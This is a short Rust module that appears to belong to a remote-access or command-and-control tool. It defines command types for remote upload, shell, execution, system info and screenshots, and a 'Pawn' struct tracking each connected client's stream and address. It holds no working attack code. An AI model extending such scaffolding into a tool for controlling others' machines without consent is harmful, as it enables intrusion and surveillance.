pub mod ops;

use std::net::{IpAddr, TcpStream};

const RECV_BUFF_SIZE: usize = 512;

#[allow(dead_code)]
pub enum CommandType {
	Upload = 10,
	Shell,
	Exec,
	SysInfo,
	ScrShot
}

#[derive(Debug)]
#[allow(dead_code)]
pub struct Pawn {
	uid: u32,
	stream: TcpStream,
	caddr: IpAddr,
	cport: u16,
}

impl Pawn {
	pub fn new(uid: u32, stream: TcpStream, caddr: IpAddr, cport: u16) -> Pawn {
		Pawn {
			uid,
			stream,
			caddr,
			cport
		}
	}

	pub fn uid(&self) -> u32 {
		self.uid
	}

	pub fn stream(&mut self) -> &mut TcpStream {
		&mut self.stream
	}

	pub fn ip(&self) -> IpAddr {
		self.caddr
	}

	pub fn _port(&self) -> u16 {
		self.cport
	}
}
